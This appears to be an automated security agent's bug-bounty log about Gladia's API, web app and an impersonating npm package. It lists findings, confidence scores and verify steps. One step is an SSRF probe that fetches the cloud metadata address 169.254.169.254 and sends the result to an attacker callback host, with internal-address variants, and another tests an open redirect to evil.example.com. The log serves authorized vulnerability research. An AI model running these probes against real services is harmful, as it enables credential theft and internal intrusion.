reasoning: Fresh 17:44 UTC probe confirms POST /v2/pre-recorded (no key) -> 401 NestJS HttpException; /openapi.json (125131B, 14 paths) exposes InitTranscriptionRequest.audio_url, video_url, callback_url, CallbackConfigDto.url all as format:uri with no scheme allowlist; /v1/models (530B, CORS *) leaks FR+US egress regions; key-gated only.
evidence_needed: Server-side fetch reaches 169.254.169.254 (AWS IMDSv1) or localhost/private CIDR; callback_url exfil path confirmed.
verify_steps: AUTH_HELPED — POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://attacker.lh/meta"}'
impact: AWS IMDSv1 metadata access, internal service enumeration, data exfiltration via callback_url. severity High.
testability: AUTH_HELPED
[HYP] Post-auth open redirect via reflected redirect_to on /signin form action + CSP form-action gap
class: OATH
asset: app.gladia.io /signin
confidence: 65
reasoning: Fresh 17:44 UTC probe confirms /signin?redirect_to=https://evil.example.com -> 200, action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" reflection; CSP verified has NO form-action directive (base-uri 'self', object-src 'none', frame-src allowlist); OAuth redirect_uri is FIXED (https://app.gladia.io/auth/google/callback) -> OAuth code/state theft REJECTED; return-to cookie tamper-reset REJECTED. Post-auth honoring is sole unverified gate.
evidence_needed: post-auth 302 Location: https://evil.example.com after completing Google OAuth (or email/password) on /signin?redirect_to=https://evil.example.com
verify_steps: HUMAN_ONLY — with program authorization, complete Google OAuth (or email/password) on app.gladia.io/signin?redirect_to=https://evil.example.com and capture final 302 Location + Set-Cookie
impact: Post-auth phishing redirect to attacker-controlled host -> brand-spoof after victim authenticates. severity Medium.
testability: HUMAN_ONLY
[PARKED] None
[FINAL]
[NEXT] HUMAN: Phase is POC, target app. With program authorization, complete the Google OAuth (or email/password) flow on https://app.gladia.io/signin?redirect_to=https://evil.example.com and capture the final post-auth 302 Location + Set-Cookie. This is the sole unverified gate for the app OATH finding (unauth reflection + CSP gap already confirmed via fresh passive probe at 17:44 UTC). If no authorized Google test account exists, request a Gladia-issued test credential to observe post-auth redirect honoring via the email/password flow. api/npm surfaces remain NO_DRIFT frozen; api SSRF hypothesis is submission-ready for AUTH_HELPED verification with a valid key in parallel.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 20+ cycles (23:08->17:44 UTC) — openapi 125131B/14 paths, /health {"health":"OK"} 15B, /v1/models 530B FR/US, preflight-only x-powered-by: Express, CORS static * + ACAH x-gladia-key — surface frozen, nothing new to report.
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed fresh 17:44 UTC — sha256 3b23ec7d...7f2 unchanged, dist-tag latest=0.1.3, repo alexisbouchez/gladia.ts + user 404 (orphaned), README "Unofficial" vs package.json "Official" contradiction, src/client.ts:307 appends raw x-gladia-key to wss://api.gladia.io/v2/live URL query. | @gladiaio/sdk@1.1.0 confirmed official from gladiaio org.
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec+RAG confirmed fresh 17:44 UTC (NO_DRIFT 20th cycle) — audio_url/video_url/callback_url format:uri no scheme allowlist; /v1/models 530B FR/US egress; POST /v2/pre-recorded 401 NestJS HttpException — key-gated only, SSRF-by-design persists (AUTH_HELPED).
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:44 UTC — form action reflects URL-encoded value; CSP lacks form-action directive (gap confirmed); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate. /auth/google/callback returns 200 (OAuth callback path live).
[HYP] Orphaned npm package `gladia`@0.1.3 impersonates official SDK, leaking API key in WebSocket URL
class: OTHER
asset: npm registry `gladia`@0.1.3 (tarball sha256 `3b23ec7d…7f2`)
confidence: 95
reasoning: `npm view gladia` latest=0.1.3, repository=git+https://github.com/alexisbouchez/gladia.ts.git (personal), maintainer=softwarecitadel@gmail.com; GitHub API returns 404 on both user `/alexisbouchez` and repo `/alexisbouchez/gladia.ts` (orphaned) while dist-tag latest persists; official @gladiaio/sdk@1.1.0 → gladiaio/sdk org. Direct RAG: package.json description "Official" vs README.md "Unofficial" contradiction; src/client.ts:306–308 `const wsUrl = new URL(`${this.baseUrl}/v2/live`); wsUrl.searchParams.append('x-gladia-key', this.apiKey);` puts raw API key in wss:// query — diverges from official POST /v2/live→wss token flow.
evidence_needed: Confirmed — tarball sha256, npm metadata, GitHub 404, code-level key-in-URL.
verify_steps: PASSIVE — `npm view gladia repository,type,description,maintainers`; `npm pack gladia@0.1.3 && tar xzf gladia-0.1.3.tgz && grep -n 'searchParams.append' package/src/client.ts && grep -i official package/package.json package/README.md`; `curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/users/alexisbouchez https://api.github.com/repos/alexisbouchez/gladia.ts`. (Done this cycle — all stable.)
impact: Supply-chain credential theft — devs install impersonated SDK; API keys leak into wss:// URL query → proxy/access/request logs, Referer headers; impersonation breeds phishing/backdoored installs. severity High.
testability: PASSIVE
[HYP] SSRF via server-side fetch of audio_url/video_url/callback_url on /v2/pre-recorded + callback_config.url
class: SSRF
asset: api.gladia.io POST /v2/pre-recorded (+ /v2/live, callback_config.url)
confidence: 73
reasoning: /openapi.json (125131B, 14 paths, CORS \*) exposes InitTranscriptionRequest.audio_url, video_url, callback_url + CallbackConfigDto.url all as `format:uri` with no scheme allowlist; SDK source forwards verbatim (no host allowlist/metadata-blocklist/redirect-limit); /v1/models (530B, CORS \*) leaks FR+US datacenter regions for egress targeting; POST /v2/pre-recorded (no key) → 401 NestJS HttpException (key sole gate); NO_DRIFT across 16 cycles.
evidence_needed: Key-gated fetch of 169.254.169.254/internal host reflected in error/status/duration, or callback_config.url egress to internal listener.
verify_steps: AUTH_HELPED — `POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://attacker.lh/meta"}'`; then `{"audio_url":"http://127.0.0.1:8080/","callback_config":{"url":"http://10.0.0.1/","method":"POST"}}`; run ≥2× to cover FR/US egress pool.
impact: AWS IMDSv1 metadata access, internal-service enumeration, data exfiltration via callback_url. severity High (gated by key).
testability: AUTH_HELPED
[HYP] Post-auth open redirect via reflected redirect_to on /signin form action + CSP form-action gap
class: OATH
asset: app.gladia.io /signin
confidence: 65
reasoning: /signin?redirect_to=https://evil.example.com → 200, `action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"` reflection confirmed across https://, //, bare-host, confusing-subdomain, path-only (200, fresh 18:00 UTC); CSP verified fresh: default-src 'self', base-uri 'self', object-src 'none', frame-src allowlist, **NO form-action directive**; Google OAuth redirect_uri is FIXED (https://app.gladia.io/auth/google/callback) → code/state theft REJECTED; return-to cookie tamper-reset REJECTED. Post-auth honoring is sole unverified gate.
evidence_needed: post-auth 302 Location to external host + Set-Cookie after completing Google SSO (or email/password) with redirect_to set.
verify_steps: HUMAN_ONLY — with program authorization, complete Google OAuth (or email/password) on `https://app.gladia.io/signin?redirect_to=https://evil.example.com` capturing final 302 Location + Set-Cookie; if no authorized Google test account, request a Gladia-issued test credential and observe redirect honoring via email/password flow.
impact: Post-auth phishing redirect to attacker-controlled host (brand-spoof after victim authenticates). severity Medium.
testability: HUMAN_ONLY
[PARKED] None — all three hypotheses meet confidence ≥40, none on the REJECTED list, each carries one of PASSIVE/AUTH_HELPED/HUMAN_ONLY concrete verify path, and all map to accepted (not rejected) classes. (OATH redirect_to reflection is ACCEPTED; OAuth redirect_uri-injection sub-angle already REJECTED so not duplicated.)
[FINAL] 1) Orphaned npm package `gladia`@0.1.3 impersonates official SDK, leaking API key in WebSocket URL (npm, 95, OTHER, PASSIVE-ready/submission-ready) → 2) SSRF via audio_url/video_url/callback_url server-side fetch (api.gladia.io, 73, SSRF, AUTH_HELPED) → 3) Post-auth open redirect via reflected redirect_to + CSP form-action gap (app.gladia.io, 65, OATH, HUMAN_ONLY).
[NEXT][HUMAN]: Phase is POC, target=app. Complete the Google OAuth (or email/password) flow on `https://app.gladia.io/signin?redirect_to=https://evil.example.com` and capture the final post-auth `302 Location` + `Set-Cookie`. This is the sole unverified gate for the app OATH finding (unauth reflection + CSP form-action gap already confirmed byte-fresh via passive probe at 18:00 UTC). If no authorized Google test account exists, request a Gladia-issued test credential to observe redirect honoring via the email/password flow. (Independent path: the npm `gladia`@0.1.3 impersonation is submission-ready now with RAG evidence — tarball sha256 `3b23ec7d…7f2`, README↔package.json contradiction, client.ts:307 raw key-in-WSS-URL — submittable in parallel; api SSRF stands AUTH_HELPED for a valid key.)
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 18 probe cycles (23:08→18:00 UTC) — openapi 125131B/14 paths, /health `{"health":"OK"}` 15B (x-powered-by ABSENT on GET, present only on OPTIONS preflight), /v1/models 530B FR/US, POST/GET /v2/transcription 401 NestJS HttpException, CORS static `*`+ACAH x-gladia-key — surface frozen, no new endpoints.
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: preflight-only `x-powered-by: Express` fingerprint differential re-confirmed fresh (OPTIONS 204 x-powered-by=Express, GET/POST 401 x-powered-by absent) — not isolated to /v2/transcription; also present on /v2/pre-recorded OPTIONS.
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec+RAG frozen (17th cycle) — audio_url/video_url/callback_url/CallbackConfig.url all `format:uri` no scheme allowlist; /v1/models confirms FR/US egress; POST /v2/pre-recorded 401 NestJS shape — key-gated only, SSRF-by-design persists (AUTH_HELPED).
[LEARN] ACCEPTED OTHER @ npm `gladia`@0.1.3: orphaned impersonation confirmed fresh — dist-tag latest=0.1.3 stable (sha256 `3b23ec7d…7f2`); repo alexisbouchez/gladia.ts + user 404 (orphaned); package.json "Official" vs README.md "Unofficial" contradiction; RAG confirms src/client.ts:306–308 appends raw `x-gladia-key` to `wss://api.gladia.io/v2/live` URL query (diverges from official POST /v2/live→token flow). @gladiaio/sdk@1.1.0 official from gladiaio org.
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed byte-fresh (action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"); CSP lacks form-action directive (gap confirmed: base-uri 'self', object-src 'none', frame-src allowlist); /auth/google/callback returns 200 (OAuth callback path live); post-auth honoring sole unverified gate.
[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no code/state theft (re-confirmed).
[LEARN] REJECTED OAUTH @ app.gladia.io: return-to cookie tampering does NOT yield open redirect — server resets to {"url":"/"} (tamper-reset confirmed).
[LEARN] CONFIRMED MISCONFIG @ app.gladia.io: /dashboard & /org & /api,/oauth,/auth,/oid4,/api/v1,/api/health,/api/me all return 200 text/html (SPA catch-all); real server-side 302 gate intact only on /apikeys,/transcriptions,/settings.
[RISK] api.gladia.io: 82 — frozen 14-path key-gated surface (NO_DRIFT 18 cycles) but exposes OpenAPI @ CORS `*` with SSRF-by-design fetch fields (no scheme allowlist), undocumented /health, /v1/models public (FR/US egress), WebSocket token-in-URL design, NestJS-on-Express, preflight-only x-powered-by fingerprint — gated only by key (AUTH_HELPED) for proven High impact.
[RISK] app.gladia.io: 62 — unauth redirect_to reflection + CSP lacks form-action confirmed; Google-only OAuth limits exploitability; HSTS/preload strong; /dashboard SPA-gated client-side; post-auth redirect honoring sole unproven gate (AUTH_HELPED/HUMAN_ONLY).
[RISK] sdk: 88 — orphaned `gladia`@0.1.3 at dist-tag latest impersonates official SDK (repo+user 404) AND embeds raw API key in wss:// query (RAG-confirmed client.ts:307); supply-chain credential-harvesting risk High; official @gladiaio/sdk@1.1.0 / gladiaio-sdk 1.0.5 clean.
